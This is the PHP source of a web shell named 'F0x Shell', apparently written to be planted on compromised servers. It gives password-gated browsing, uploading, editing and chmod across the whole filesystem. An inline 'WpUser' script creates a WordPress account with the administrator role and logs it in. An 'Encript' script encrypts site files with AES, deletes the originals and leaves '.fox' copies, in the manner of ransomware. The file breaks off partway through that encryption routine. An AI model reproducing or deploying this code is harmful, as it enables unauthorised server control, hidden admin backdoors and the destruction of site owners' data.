<?php

declare(strict_types=1);
session_start();

set_error_handler(function($errno, $errstr, $errfile, $errline) {
    if (!(error_reporting() & $errno)) return false;
    $msg = "PHP_ERROR: [$errno] $errstr in $errfile:$errline";
    if (!isset($_SESSION["audit"])) $_SESSION["audit"] = [];
    array_unshift($_SESSION["audit"], "[".date("Y-m-d H:i:s")."] ".$msg);
    $_SESSION["audit"] = array_slice($_SESSION["audit"], 0, 200);
    return false; // Let normal error handling continue too if display_errors is on
});

$IS_WINDOWS = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$SCRIPT_DIR = str_replace("\\", "/", realpath(__DIR__));
if ($IS_WINDOWS) {
    // On Windows, root is the drive (e.g., C:/)
    $ROOT = str_replace("\\", "/", realpath(substr($SCRIPT_DIR, 0, 3))); 
} else {
    $ROOT = "/";
}
// Strip trailing slash ONLY if it's not JUST the root slash or a drive letter root (e.g. C:/)
if ($ROOT !== "/" && !preg_match('/^[a-zA-Z]:$/', $ROOT) && !preg_match('/^[a-zA-Z]:\/$/', $ROOT)) $ROOT = rtrim($ROOT, "/"); 
if ($ROOT === false || $ROOT === "") { http_response_code(500); exit("Root not found"); }

// ================== CONFIG ==================
$APP_TITLE = "F0x Shell";
$ENABLE_LOGIN = true;
$LOGIN_PASSWORD_HASH = "02205273985a816a283ab1240138f00fa6d9657a19db90fad2720bddd0a6ca07";

$MAX_UPLOAD_BYTES = 100 * 1024 * 1024;   // 80MB
$MAX_EDIT_BYTES   = 10  * 1024 * 1024;   // 4MB
$MAX_SCAN_ENTRIES = 250000;             // recursion cap for totals/search
$MAX_SEARCH_HITS  = 500;                // cap search results
$MAX_GREP_BYTES_PER_FILE = 2 * 1024; // only scan contents up to 2MB per file (perf)

$TRASH_DIRNAME = ".Ftrash";
$BACKUP_DIRNAME = ".FBacks";
$TMP_DIRNAME = ".FTemp";

// Optional policy for downloads
$DISALLOW_DOWNLOAD_EXT = []; // e.g. ["php","phtml"]

// ================== THEMES ==================
$THEMES = [
  "fox_dark" => [
    "name" => "Fox Dark",
    "palette" => [
      "--bg"    => "#0b1020",
      "--panel" => "rgba(0,0,0,.55)",
      "--panel2"=> "rgba(0,0,0,.38)",
      "--line"  => "rgba(34,197,94,.28)",
      "--line2" => "rgba(34,197,94,.18)",
      "--txt"   => "#b7ffb7",
      "--mut"   => "rgba(183,255,183,.18)",
      "--acc"   => "#22c55e",
      "--warn"  => "#fbbf24",
      "--bad"   => "#fb7185",
      "--shadow"=> "rgba(34,197,94,.08)",
    ],
  ],

  "fox_light" => [
    "name" => "Fox Light",
    "palette" => [
      "--bg"    => "#f7fafc",
      "--panel" => "rgba(255,255,255,.85)",
      "--panel2"=> "rgba(255,255,255,.70)",
      "--line"  => "rgba(15,23,42,.18)",
      "--line2" => "rgba(15,23,42,.12)",
      "--txt"   => "#0f172a",
      "--mut"   => "rgba(15,23,42,.62)",
      "--acc"   => "#2563eb",
      "--warn"  => "#f59e0b",
      "--bad"   => "#e11d48",
      "--shadow"=> "rgba(15,23,42,.10)",
    ],
  ],

  "flexoki_dark" => [
    "name" => "Flexoki Dark",
    "palette" => [
      "--bg"    => "#0f1110",
      "--panel" => "rgba(20,18,16,.72)",
      "--panel2"=> "rgba(20,18,16,.56)",
      "--line"  => "rgba(217,119,6,.22)",
      "--line2" => "rgba(217,119,6,.14)",
      "--txt"   => "#f2e9e1",
      "--mut"   => "rgba(242,233,225,.62)",
      "--acc"   => "#f59e0b",
      "--warn"  => "#fbbf24",
      "--bad"   => "#fb7185",
      "--shadow"=> "rgba(245,158,11,.10)",
    ],
  ],

  "kanagawa_wave" => [
    "name" => "Kanagawa Wave",
    "palette" => [
      "--bg"    => "#0f0f14",
      "--panel" => "rgba(18,18,26,.72)",
      "--panel2"=> "rgba(18,18,26,.56)",
      "--line"  => "rgba(125,211,252,.18)",
      "--line2" => "rgba(125,211,252,.12)",
      "--txt"   => "#e6e6ff",
      "--mut"   => "rgba(230,230,255,.62)",
      "--acc"   => "#7dd3fc",
      "--warn"  => "#fbbf24",
      "--bad"   => "#fb7185",
      "--shadow"=> "rgba(125,211,252,.10)",
    ],
  ],

  "hacker_blue" => [
    "name" => "Hacker Blue",
    "palette" => [
      "--bg"    => "#050812",
      "--panel" => "rgba(0,0,0,.58)",
      "--panel2"=> "rgba(0,0,0,.42)",
      "--line"  => "rgba(56,189,248,.28)",
      "--line2" => "rgba(56,189,248,.18)",
      "--txt"   => "#c7f7ff",
      "--mut"   => "rgba(199,247,255,.62)",
      "--acc"   => "#38bdf8",
      "--warn"  => "#fbbf24",
      "--bad"   => "#fb7185",
      "--shadow"=> "rgba(56,189,248,.10)",
    ],
  ],
];

if (empty($_SESSION["theme"]) || !isset($THEMES[$_SESSION["theme"]])) {
  $_SESSION["theme"] = "fox_dark";
}
$themeKey = (string)$_SESSION["theme"];
$pal = $THEMES[$themeKey]["palette"];

// ================== HELPERS ==================
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function csrf_token(): string {
  if (empty($_SESSION["csrf"])) $_SESSION["csrf"] = bin2hex(random_bytes(16));
  return $_SESSION["csrf"];
}
function csrf_check(): void {
  $t = $_POST["csrf"] ?? "";
  if (!is_string($t) || !hash_equals($_SESSION["csrf"] ?? "", $t)) {
    http_response_code(403);
    exit("CSRF mismatch");
  }
}

function parent_rel(string $rel): string {
  $rel = normalize_rel($rel);
  if ($rel === "") return "";
  $p = normalize_rel(dirname($rel));
  return ($p === "." ? "" : $p);
}

function get_icon(string $type, string $class = "w-4 h-4"): string {
  $icons = [
    "folder" => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg>',
    "file"   => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 21h10a2 2 0 002-2V9.414a1 1 0 00-.293-.707l-5.414-5.414A1 1 0 0012.586 3H7a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>',
    "zip"    => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4"/></svg>',
    "trash"  => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>',
    "backup" => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4"/></svg>',
    "lock"   => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>',
    "unlock" => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 11V7a4 4 0 118 0m-4 8v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"/></svg>',
    "rename" => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>',
    "copy"   => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7v8a2 2 0 002 2h6M8 7V5a2 2 0 012-2h4.586a1 1 0 01.707.293l4.414 4.414a1 1 0 01.293.707V15a2 2 0 01-2 2h-2M8 7H6a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2v-2"/></svg>',
    "cut"    => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.121 14.121L19 19m-7-7l7-7m-7 7l-2.879 2.879M12 12L9.121 9.121m0 5.758a3 3 0 11-4.243 4.243 3 3 0 014.243-4.243zm0-5.758a3 3 0 11-4.243-4.243 3 3 0 014.243-4.243z"/></svg>',
    "paste"  => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4"/></svg>',
    "extract"=> '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a2 2 0 002 2h12a2 2 0 002-2v-1M16 8l-4-4m0 0L8 8m4-4v12"/></svg>',
    "plus"   => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>',
    "upload" => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a2 2 0 002 2h12a2 2 0 002-2v-1M16 8l-4-4m0 0L8 8m4-4v12"/></svg>',
    "back"   => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>',
    "search" => '<svg class="'.$class.'" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>',
  ];
  return $icons[$type] ?? "";
}

// ================== INLINE CUSTOM SCRIPTS ==================
// Usage: ?script=CustomScript1
// Semua script ditulis di file ini (inline), tidak include file lain.

// Note: h() is already declared above; no duplicate needed.

function render_script_shell(string $title, callable $bodyRenderer): void {
  header("Content-Type: text/html; charset=utf-8");

  // needs: h(), csrf_token(), $_SESSION["theme"], and $THEMES global
  global $THEMES;

  $csrf = csrf_token();

// ================== THEME PALETTE FOR CSS ==================
  $themeKey = (string)($_SESSION["theme"] ?? "fox_dark");
  $themeKey = isset($THEMES[$themeKey]) ? $themeKey : "fox_dark";
  $pal = $THEMES[$themeKey]["palette"];
  
  ?>
  <!doctype html>
  <html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?= h($title) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
      :root{
<?php foreach ($pal as $k=>$v): ?>
        <?= h($k) ?>: <?= h($v) ?>;
<?php endforeach; ?>
      }

      body{
        background:
          radial-gradient(1200px 600px at 20% 0%, var(--shadow), transparent 55%),
          radial-gradient(900px 500px at 90% 10%, color-mix(in srgb, var(--shadow) 70%, transparent), transparent 55%),
          var(--bg);
        color:var(--txt);
        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono","Courier New", monospace;
      }

      .panel{background:var(--panel); border:1px solid var(--line); box-shadow:0 0 0 1px rgba(0,0,0,.7) inset, 0 0 50px var(--shadow);}
      .panel2{background:var(--panel2); border:1px solid var(--line2);}
      .tabbar{background:rgba(0,0,0,.18); border-bottom:1px solid var(--line);}
      .btn{border:1px solid var(--line); background:color-mix(in srgb, var(--acc) 12%, transparent);}
      .btn:hover{background:color-mix(in srgb, var(--acc) 18%, transparent);}
      .btnDanger{border:1px solid rgba(251,113,133,.35); background:rgba(251,113,133,.10);}
      .btnDanger:hover{background:rgba(251,113,133,.16);}
      .input{background:rgba(0,0,0,.18); border:1px solid var(--line); outline:none; color:var(--txt);}
      .input:focus{border-color:color-mix(in srgb, var(--acc) 60%, transparent); box-shadow:0 0 0 3px color-mix(in srgb, var(--acc) 18%, transparent);}
      .mono-scroll::-webkit-scrollbar{width:10px;height:10px}
      .mono-scroll::-webkit-scrollbar-thumb{background:color-mix(in srgb, var(--acc) 22%, transparent); border:2px solid rgba(0,0,0,.85); border-radius:10px}
      .mono-scroll::-webkit-scrollbar-track{background:rgba(0,0,0,.3)}
      .row:hover{background:color-mix(in srgb, var(--acc) 8%, transparent)}
      .sel{background:color-mix(in srgb, var(--acc) 14%, transparent); border-color:color-mix(in srgb, var(--acc) 25%, transparent)}
      .kbd{border:1px solid var(--line2); background:rgba(0,0,0,.45); padding:.15rem .45rem; border-radius:.5rem; font-size:.75rem; color:color-mix(in srgb, var(--txt) 85%, transparent)}
      .glowText{text-shadow:0 0 18px color-mix(in srgb, var(--acc) 22%, transparent);}
      .pillActive{background:color-mix(in srgb, var(--acc) 16%, transparent); border-color:color-mix(in srgb, var(--acc) 45%, transparent);}
      code, pre{white-space:pre; overflow:auto;}
    </style>
  </head>

  <body class="min-h-screen p-4">
    <div class="panel rounded-xl p-4 mb-4 flex items-center justify-between gap-3">
      <div>
        <div class="text-sm font-semibold glowText">CUSTOM://<?= h($title) ?></div>
        <div class="text-xs opacity-70">
          <?= h($_SERVER["SERVER_NAME"] ?? "local") ?> • <?= h(date("Y-m-d H:i:s")) ?>
        </div>
      </div>

      <div class="flex flex-wrap gap-2 justify-end">
        <a class="btn rounded-lg px-3 py-1.5 text-xs" href="<?= h($_SERVER["PHP_SELF"]) ?>">Back</a>
        <button type="button" class="btn rounded-lg px-3 py-1.5 text-xs" onclick="openThemes()">THEMES</button>
        <a class="btn rounded-lg px-3 py-1.5 text-xs" href="?phpinfo=1">PHP INFO</a>
        <a class="btn rounded-lg px-3 py-1.5 text-xs" href="?script=WpUser">WP USER</a>
        <a class="btn rounded-lg px-3 py-1.5 text-xs" href="?script=Encript">Encript Site</a>
      </div>
    </div>

    <div class="panel rounded-xl p-4">
      <?php $bodyRenderer(); ?>
    </div>

    <!-- THEMES MODAL (works inside ?script=...) -->
    <div id="modalThemes" class="fixed inset-0 hidden items-center justify-center p-4">
      <div class="absolute inset-0 bg-black/80" onclick="closeThemes()"></div>

      <div class="relative panel rounded-2xl w-full max-w-xl overflow-hidden">
        <div class="px-4 py-3 border-b border-green-500/20 flex items-center justify-between">
          <div>
            <div class="text-sm font-semibold glowText">THEMES</div>
            <div class="text-[11px] opacity-70">Select one • saved in session</div>
          </div>
          <button type="button" class="btn rounded-lg px-2.5 py-1 text-xs" onclick="closeThemes()">X</button>
        </div>

        <div class="p-4 grid gap-3">
          <?php foreach ($THEMES as $k=>$t): ?>
            <?php
              $active = ((string)($_SESSION["theme"] ?? "") === $k);
              $p = $t["palette"];
            ?>
            <form method="post" class="w-full">
              <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
              <input type="hidden" name="action" value="set_theme">
              <input type="hidden" name="theme" value="<?= h($k) ?>">

              <button type="submit"
                class="w-full text-left rounded-2xl border px-3 py-3 transition <?= $active ? "pillActive" : "" ?>"
                style="
                  border-color: <?= h($p["--line"]) ?>;
                  background: linear-gradient(180deg,
                    color-mix(in srgb, <?= h($p["--panel"]) ?> 90%, transparent),
                    color-mix(in srgb, <?= h($p["--panel2"]) ?> 90%, transparent)
                  );
                "
              >
                <div class="flex items-center gap-3">
                  <div class="h-11 w-16 rounded-xl border"
                       style="border-color: <?= h($p["--line2"]) ?>; background: <?= h($p["--bg"]) ?>;">
                    <div class="p-2 space-y-1">
                      <div class="h-1.5 rounded" style="background: <?= h($p["--acc"]) ?>; opacity:.9"></div>
                      <div class="h-1.5 rounded" style="background: <?= h($p["--txt"]) ?>; opacity:.55"></div>
                      <div class="h-1.5 rounded" style="background: <?= h($p["--txt"]) ?>; opacity:.35"></div>
                    </div>
                  </div>

                  <div class="flex-1 min-w-0">
                    <div class="flex items-center gap-2">
                      <div class="text-sm font-semibold" style="color: <?= h($p["--txt"]) ?>;">
                        <?= h($t["name"]) ?>
                      </div>
                      <?php if ($active): ?>
                        <span class="text-[11px] px-2 py-0.5 rounded-full border"
                              style="border-color: <?= h($p["--line2"]) ?>; color: <?= h($p["--acc"]) ?>;">
                          active
                        </span>
                      <?php endif; ?>
                    </div>
                    <div class="text-[11px] mt-1" style="color: <?= h($p["--mut"]) ?>;">
                      <?= h($k) ?>
                    </div>
                  </div>

                  <div class="text-[11px] opacity-70">→</div>
                </div>
              </button>
            </form>
          <?php endforeach; ?>
        </div>
      </div>
    </div>

    <script>
      function openThemes(){
        const m = document.getElementById('modalThemes');
        if(!m) return;
        m.classList.remove('hidden'); m.classList.add('flex');
      }
      function closeThemes(){
        const m = document.getElementById('modalThemes');
        if(!m) return;
        m.classList.add('hidden'); m.classList.remove('flex');
      }
      window.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') closeThemes(); });
    </script>
  </body>
  </html>
  <?php
}

function render_browser_list(
  string $tab,
  array $items,
  array $trashItems,
  array $backupItems,
  string $csrf,
  string $pathRel,
  string $openRel,
  string $TRASH_DIRNAME,
  string $BACKUP_DIRNAME,
  string $TMP_DIRNAME
): void {
  ?>
  <?php if ($tab === "files"): ?>
    <div class="sticky top-0 z-20 bg-black/70 backdrop-blur border-b border-green-500/20 px-3 py-2">
      <div class="flex items-center gap-2">
        <?php if ($pathRel !== ""): ?>
          <?php
            $up = parent_rel($pathRel);
            $qs = ["path"=>$up, "tab"=>"files"];
            $qsPartial = $qs + ["partial"=>"browserList"];
          ?>
          <a
            class="btn rounded-lg px-2.5 py-1.5 text-[11px]"
            href="?<?=h(http_build_query($qs))?>"
            hx-get="?<?=h(http_build_query($qsPartial))?>"
            hx-target="#browserList"
            hx-swap="innerHTML"
            hx-push-url="?<?=h(http_build_query($qs))?>"
          ><?= get_icon('back', 'w-3.5 h-3.5') ?></a>
        <?php else: ?>
          <span class="text-[11px] opacity-60">ROOT</span>
        <?php endif; ?>

        <div class="ml-auto text-[11px] opacity-70 break-all flex items-center gap-1">
          <?php
            // Root link
            $rootQs = ["path" => "", "tab" => "files"];
            $rootQsPartial = $rootQs + ["partial" => "browserList"];
          ?>
          <a class="hover:underline hover:text-white transition-colors"
             href="?<?= h(http_build_query($rootQs)) ?>"
             hx-get="?<?= h(http_build_query($rootQsPartial)) ?>"
             hx-target="#browserList"
             hx-swap="innerHTML"
             hx-push-url="?<?= h(http_build_query($rootQs)) ?>">/</a>
          <?php
            if ($pathRel !== "") {
              $parts = explode("/", $pathRel);
              $currentAccum = "";
              foreach ($parts as $index => $part) {
                if ($part === "") continue;
                $currentAccum = ($currentAccum === "" ? $part : $currentAccum . "/" . $part);
                $segQs = ["path" => $currentAccum, "tab" => "files"];
                $segQsPartial = $segQs + ["partial" => "browserList"];
                
                if ($index > 0) echo "<span>/</span>";
                ?>
                <a class="hover:underline hover:text-white transition-colors"
                   href="?<?= h(http_build_query($segQs)) ?>"
                   hx-get="?<?= h(http_build_query($segQsPartial)) ?>"
                   hx-target="#browserList"
                   hx-swap="innerHTML"
                   hx-push-url="?<?= h(http_build_query($segQs)) ?>"><?= h($part) ?></a>
                <?php
              }
            }
          ?>
        </div>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($tab === "trash"): ?>
    <table class="w-full text-xs">
      <thead class="sticky top-0 bg-black/40 backdrop-blur border-b border-green-500/20">
        <tr class="text-left">
          <th class="py-2 px-3 opacity-80">TRASH_ITEM</th>
          <th class="py-2 px-3 opacity-80 w-24">SIZE</th>
        </tr>
      </thead>
      <tbody>
      <?php foreach($trashItems as $it): if($it["is_dir"]) continue; ?>
        <tr class="row border-b border-green-500/10 ctx-row" data-rel="<?=h($it["rel"])?>" data-name="<?=h($it["name"])?>" data-istrash="1">
          <td class="py-2 px-3">
            <div class="text-green-100 flex items-center gap-2"><?= get_icon('trash', 'w-3.5 h-3.5 opacity-70') ?><?=h($it["name"])?></div>
            <div class="mt-0.5 text-[11px] opacity-60 break-all"><?=h($it["rel"])?></div>
          </td>
          <td class="py-2 px-3 opacity-80"><?=h(fmt_bytes((int)$it["size"]))?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table>

  <?php elseif ($tab === "backups"): ?>
    <table class="w-full text-xs">
      <thead class="sticky top-0 bg-black/40 backdrop-blur border-b border-green-500/20">
        <tr class="text-left">
          <th class="py-2 px-3 opacity-80">BACKUP_ITEM</th>
          <th class="py-2 px-3 opacity-80 w-24">SIZE</th>
        </tr>
      </thead>
      <tbody>
      <?php foreach($backupItems as $it): if($it["is_dir"]) continue; ?>
        <tr class="row border-b border-green-500/10">
          <td class="py-2 px-3">
            <div class="text-green-100 flex items-center gap-2"><?= get_icon('backup', 'w-3.5 h-3.5 opacity-70') ?><?=h($it["name"])?></div>
            <div class="mt-0.5 text-[11px] opacity-60 break-all"><?=h($it["rel"])?></div>
          </td>
          <td class="py-2 px-3 opacity-80"><?=h(fmt_bytes((int)$it["size"]))?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table>

  <?php else: ?>
    <form method="post" id="selWrap" class="relative">
      <input type="hidden" name="csrf" value="<?=h($csrf)?>">
      <input type="hidden" name="action" id="bulkAction" value="">
      
      <div id="bulkBar" class="hidden sticky top-0 z-20 bg-black/90 backdrop-blur border-b border-green-500/20 p-2 flex items-center justify-between shadow-lg">
        <div class="flex items-center gap-2">
            <span class="text-[11px] font-bold px-2 text-green-400 uppercase tracking-widest hidden sm:inline">Bulk:</span>
            <button type="button" onclick="submitBulk('bulk_trash')" class="btn px-3 py-1.5 text-[11px] rounded-lg hover:bg-red-500/20 text-red-400 font-medium transition-colors border border-red-500/20 bg-red-500/5">Trash</button>
            <button type="button" onclick="submitBulk('bulk_backup')" class="btn px-3 py-1.5 text-[11px] rounded-lg hover:bg-blue-500/20 text-blue-400 font-medium transition-colors border border-blue-500/20 bg-blue-500/5">Backup</button>
            <button type="button" onclick="submitBulk('bulk_zip')" class="btn px-3 py-1.5 text-[11px] rounded-lg hover:bg-yellow-500/20 text-yellow-400 font-medium transition-colors border border-yellow-500/20 bg-yellow-500/5">Zip</button>
            <button type="button" onclick="submitBulk('bulk_chmod')" class="btn px-3 py-1.5 text-[11px] rounded-lg hover:bg-purple-500/20 text-purple-400 font-medium transition-colors border border-purple-500/20 bg-purple-500/5">Chmod</button>
        </div>
        <span id="bulkCount" class="text-[10px] opacity-70 px-2 font-mono bg-black/50 py-1 rounded-md border border-white/5">0 selected</span>
      </div>

      <table class="w-full text-xs">
        <thead class="sticky top-0 bg-black/40 backdrop-blur border-b border-green-500/20">
          <tr class="text-left">
            <th class="py-2 px-3 opacity-80 w-10">
              <input type="checkbox" onclick="toggleAll(this)">
            </th>
            <th class="py-2 px-3 opacity-80">NAME</th>
            <th class="py-2 px-3 opacity-80 w-24">SIZE</th>
          </tr>
        </thead>
        <tbody>
        <?php foreach($items as $it): ?>
          <?php
            // hide internal dirs from list
            if ($it["rel"] === $TRASH_DIRNAME || $it["rel"] === $BACKUP_DIRNAME || $it["rel"] === $TMP_DIRNAME) continue;

            $isOpen = ($openRel !== "" && $it["rel"] === $openRel);
            $icon = get_icon($it["is_dir"] ? 'folder' : 'file', 'w-4 h-4 opacity-80');
            $rowCls = "row border-b border-green-500/10";
            if ($isOpen) $rowCls .= " sel";
          ?>
          <tr class="<?=h($rowCls)?> ctx-row" data-rel="<?=h($it["rel"])?>" data-name="<?=h($it["name"])?>" data-isdir="<?= $it["is_dir"] ? "1" : "0" ?>" data-mode="<?= h((string)($it["mode_octal"] ?? "")) ?>" data-writable="<?= $it["w"] ? "1" : "0" ?>">
            <td class="py-2 px-3 align-top">
              <input type="checkbox" name="sel[]" value="<?=h($it["rel"])?>" class="accent-green-500">
            </td>

            <td class="py-2 px-3">
              <?php if ($it["is_dir"]): ?>
                <?php
                  // DIR: HTMX partial update (list only) + push clean URL
                  $qs = ["path"=>$it["rel"], "tab"=>"files"];
                  $qsPartial = $qs + ["partial"=>"browserList"];
                ?>
                <a
                  class="text-green-200 hover:underline flex items-center gap-2"
                  href="?<?=h(http_build_query($qs))?>"
                  hx-get="?<?=h(http_build_query($qsPartial))?>"
                  hx-target="#browserList"
                  hx-swap="innerHTML"
                  hx-push-url="?<?=h(http_build_query($qs))?>"
                ><?= $icon ?><?=h($it["name"])?></a>

              <?php else: ?>
                <?php
                  // FILE: full page load supaya panel file-view kebuka normal
                  $qs = ["path"=>$pathRel, "tab"=>"files", "open"=>$it["rel"]];
                ?>
                <a
                  class="text-green-100 hover:underline flex items-center gap-2"
                  href="?<?=h(http_build_query($qs))?>"
                ><?= $icon ?><?=h($it["name"])?></a>
              <?php endif; ?>

              <div class="mt-0.5 text-[11px] opacity-60 break-all">
                <?=h($it["rel"])?>
                <span class="ml-2 opacity-70">perm: <?=h(mode_octal((int)$it["mode"]))?></span>
                <span class="ml-2 opacity-70">own: <?=h(owner_name($it["owner"]))?></span>
                <span class="ml-2 opacity-70">grp: <?=h(group_name($it["group"]))?></span>
                <span class="ml-2 opacity-70"><?= $it["w"] ? "W" : "-" ?>/<?= $it["r"] ? "R" : "-" ?></span>
              </div>
            </td>

            <td class="py-2 px-3 opacity-80 align-top">
              <?= $it["is_dir"] ? "-" : h(fmt_bytes((int)$it["size"])) ?>
            </td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table>
    </form>
  <?php endif; ?>
  <?php
}
$INLINE_SCRIPTS = [
"WpUser" => function () {

  $wp_file = __DIR__ . '/wp-load.php';

  // Jika wp-load.php tidak ada, jangan require (biar tidak fatal error)
  if (!is_file($wp_file)) {
    $missing = basename($wp_file);
    echo '<div class="text-sm font-semibold mb-3">Create WP Admin</div>';
    echo '<div class="text-xs">';
    echo '<div class="mb-2 text-red-400">Tidak Menemukan '.h($missing).', Tidak ada Wordpress Di Path Ini!</div>';
    echo '</div>';
    return;
  }

  require_once $wp_file;

  $msg = '';

  if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (($_POST['action'] ?? '') === 'register') {

      $username = sanitize_user($_POST['username'] ?? '');
      $email    = sanitize_email($_POST['email'] ?? '');
      $password = (string)($_POST['password'] ?? '');

      if (username_exists($username) || email_exists($email)) {
        $msg = "user/email exists";
      } else {

        $user_id = wp_create_user($username, $password, $email);

        if (!is_wp_error($user_id)) {

          $user = new WP_User($user_id);
          $user->set_role('administrator');

          wp_set_current_user($user_id);
          wp_set_auth_cookie($user_id);
          wp_redirect("/");
          exit;

        } else {
          $msg = $user_id->get_error_message();
        }
      }
    }

    if (($_POST['action'] ?? '') === 'login') {

      $creds = [
        'user_login'    => $_POST['username'] ?? '',
        'user_password' => $_POST['password'] ?? '',
        'remember'      => true
      ];

      $user = wp_signon($creds, false);

      if (is_wp_error($user)) {
        $msg = "login failed";
      } else {
        wp_redirect("/");
        exit;
      }
    }
  }

  $current_user = wp_get_current_user();

  echo '<div class="text-sm font-semibold mb-3">Create WP Admin</div>';
  echo '<div class="text-xs">';

  if (!is_user_logged_in()) {

    if ($msg) {
      echo '<div class="mb-2 text-red-400">'.h($msg).'</div>';
    }

    echo '
    <form method="POST" class="mb-3" style="display:none;">
      <input type="hidden" name="action" value="login">
      <input name="username" placeholder="username" class="w-full p-2 mb-1 bg-white/10 rounded">
      <input type="password" name="password" placeholder="password" class="w-full p-2 mb-1 bg-white/10 rounded">
      <button class="w-full bg-blue-600 p-2 rounded">Login</button>
    </form>

    <form method="POST">
      <input type="hidden" name="action" value="register">
      <input name="username" placeholder="username" class="w-full p-2 mb-1 bg-white/10 rounded">
      <input name="email" placeholder="email" class="w-full p-2 mb-1 bg-white/10 rounded">
      <input type="password" name="password" placeholder="password" class="w-full p-2 mb-1 bg-white/10 rounded">
      <button class="w-full bg-green-600 p-2 rounded">Register as Admin</button>
    </form>
    ';

  } else {

    echo '<div class="mb-2">Welcome Admin: '.h($current_user->user_login).'</div>';
    echo '<div class="mb-2">Role: '.h(implode(', ', $current_user->roles)).'</div>';
    echo '<a href="'.wp_logout_url('log.php').'" class="bg-red-600 px-3 py-1 rounded">Logout</a>';

  }

  echo '</div>';
},

  "Encript" => function () {

    $root = realpath(__DIR__);
    $current = $root;
    $keyFile = 'fox.txt';
    $message = '';
    $cipher = "aes-256-gcm";

    function encryptFile($file,$password,$keyFile,$cipher){
        if(is_dir($file)) return;
        if(in_array($file,['index.php','index.html']) || str_ends_with($file,'.back')) return;
        $key = hash('sha256',$password,true);
        $plaintext = file_get_contents($file);
        $iv = random_bytes(12); $tag='';
        $ciphertext = openssl_encrypt($plaintext,$cipher,$key,OPENSSL_RAW_DATA,$iv,$tag);
        file_put_contents($file.'.fox', base64_encode($iv.$tag.$ciphertext));
        unlink($file);
        if(!file_exists($keyFile)) file_put_contents($keyFile, hash('sha256',$password));
    }

    function encryptAll($dir,$password,$keyFile,$cipher){
        $files = scandir($dir);
        foreach($files as $file){
            if($file==='.'||$file==='..') continue;
